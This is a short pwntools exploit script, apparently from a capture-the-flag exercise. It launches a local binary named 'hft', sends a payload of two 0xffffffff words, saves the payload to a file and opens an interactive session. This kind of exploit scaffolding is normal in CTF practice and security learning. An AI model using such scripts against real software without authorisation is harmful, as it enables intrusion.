from pwn import *

elf =context.binary =ELF('./hft')

p =process()

payload =flat(
	0xffffffff,
	0xffffffff
	)
	
	

p.sendline(payload)


write('pay',payload)
p.interactive()





